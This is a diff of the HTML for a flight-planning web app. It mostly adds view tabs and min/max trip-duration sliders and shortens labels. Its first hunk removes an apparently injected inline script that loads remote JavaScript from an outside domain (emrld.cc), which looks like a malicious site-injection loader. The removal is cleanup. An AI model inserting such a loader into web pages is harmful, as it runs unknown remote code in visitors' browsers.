@@ -6,14 +6,6 @@
     <title>Flight Planner Pro</title>
     <link rel="stylesheet" href="style.css">
     <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
-    <script data-noptimize="1" data-cfasync="false" data-wpfc-render="false">
-      (function () {
-          var script = document.createElement("script");
-          script.async = 1;
-          script.src = 'https://emrld.cc/NTA1OTc1.js?t=505975';
-          document.head.appendChild(script);
-      })();
-    </script>
 </head>
 <body>
 
@@ -23,10 +15,14 @@
             <span class="icon">✈️</span>
             <h1>Flight Planner</h1>
         </div>
+
+        <nav class="view-tabs">
+            <button class="nav-tab active" data-view="longhaul">🌎 World Explorer</button>
+            <button class="nav-tab" data-view="citybreak">🍺 Kraków Weekend</button>
+        </nav>
         
-        <!-- Section 1: Filters -->
         <div class="sidebar-section">
-            <label class="section-label">Active Filters</label>
+            <label class="section-label">Route Filters</label>
             <div class="range-container">
                 <p class="help-text">Max Distance from KRK</p>
                 <div class="range-row">
@@ -37,33 +33,36 @@
             </div>
 
             <div class="range-container" style="margin-top: 1rem;">
-                <p class="help-text">Max Trip Duration</p>
+                <p class="help-text">Trip Duration (Min - Max Days)</p>
                 <div class="range-row">
-                    <input type="range" id="filter-duration" min="1" max="30" step="1" value="30">
-                    <span class="range-val"><span id="val-duration">30</span>d</span>
+                    <input type="range" id="min-duration" min="1" max="30" step="1" value="1">
+                    <span class="range-val"><span id="val-min-dur">1</span>d</span>
+                </div>
+                <div class="range-row">
+                    <input type="range" id="max-duration" min="1" max="30" step="1" value="30">
+                    <span class="range-val"><span id="val-max-dur">30</span>d</span>
                 </div>
             </div>
         </div>
 
-        <!-- Section 2: Importance Weights -->
         <div class="sidebar-section">
-            <label class="section-label">What's Important? (Weights)</label>
+            <label class="section-label">Importance (Weights)</label>
             <div class="range-container">
-                <p class="help-text">Low Price Importance</p>
+                <p class="help-text">Low Price</p>
                 <div class="range-row">
                     <input type="range" id="w-price" min="0" max="2" step="0.1" value="1.0">
                     <span class="range-val" id="val-w-price">1.0</span>
                 </div>
             </div>
             <div class="range-container">
-                <p class="help-text">Origin Distance Importance</p>
+                <p class="help-text">Origin Distance</p>
                 <div class="range-row">
                     <input type="range" id="w-dist" min="0" max="2" step="0.1" value="0.5">
                     <span class="range-val" id="val-w-dist">0.5</span>
                 </div>
             </div>
             <div class="range-container">
-                <p class="help-text">Best Weather Importance</p>
+                <p class="help-text">Peak Season</p>
                 <div class="range-row">
                     <input type="range" id="w-weather" min="0" max="2" step="0.1" value="0.5">
                     <span class="range-val" id="val-w-weather">0.5</span>
@@ -71,11 +70,10 @@
             </div>
         </div>
 
-        <!-- Section 3: Manage Destinations -->
         <div class="sidebar-section">
-            <label class="section-label">Tracked Destinations</label>
+            <label class="section-label">Destinations</label>
             <div class="smart-input">
-                <input type="text" id="dest-autocomplete" list="dest-suggestions" placeholder="Add country or city...">
+                <input type="text" id="dest-autocomplete" list="dest-suggestions" placeholder="Add country/city...">
                 <datalist id="dest-suggestions"></datalist>
                 <button id="add-dest-btn" class="btn-primary-sm">Add</button>
             </div>
@@ -95,20 +93,17 @@
                 <span id="stat-best-price" class="metric-value">--</span>
             </div>
             <div class="metric">
-                <span class="metric-label">Active Routes</span>
+                <span class="metric-label">Results</span>
                 <span id="stat-total-routes" class="metric-value">--</span>
             </div>
             <div class="metric">
-                <span class="metric-label">Precision Engine</span>
-                <span class="metric-value" id="precision-status" style="color: var(--warning)">Standby</span>
+                <span class="metric-label">View</span>
+                <span class="metric-value" id="current-view-name">Long-Haul</span>
             </div>
         </header>
 
         <div class="view-container">
             <section class="section-deals">
-                <div class="section-header">
-                    <h2>Live Opportunities</h2>
-                </div>
                 <div id="deals-grid" class="deals-grid"></div>
             </section>
 
